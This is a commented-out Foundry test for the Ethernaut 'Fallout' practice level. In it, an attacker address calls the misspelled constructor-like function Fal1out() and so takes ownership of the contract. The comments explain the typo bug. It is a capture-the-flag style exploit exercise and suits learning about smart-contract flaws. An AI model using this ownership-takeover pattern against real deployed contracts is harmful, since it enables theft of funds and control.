// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "../src/Fallout.sol";

// contract FalloutTest is Test{
//     Fallout out;

//     address attacker = mkaddr("attacker");

//     function setUp() public {
//         out = new Fallout();
//     }

//     //At this point the contract owner is address zero because the owner variable was never 
//     //initialized due to the typo made and will be set to the default value of address(0) at deployment time.
//     function testOwner() public view returns(address) {
//         return out.owner();
//     }

//     function testhackFallout() public {
//         vm.startPrank(attacker);
//         out.Fal1out();
//         //The attacker is now the contract owner
//         out.owner();
//         vm.stopPrank();
//     }

//      function mkaddr(string memory name) public returns (address) {
//         address addr = address(
//             uint160(uint256(keccak256(abi.encodePacked(name))))
//         );
//         vm.label(addr, name);
//         return addr;
//     }

// }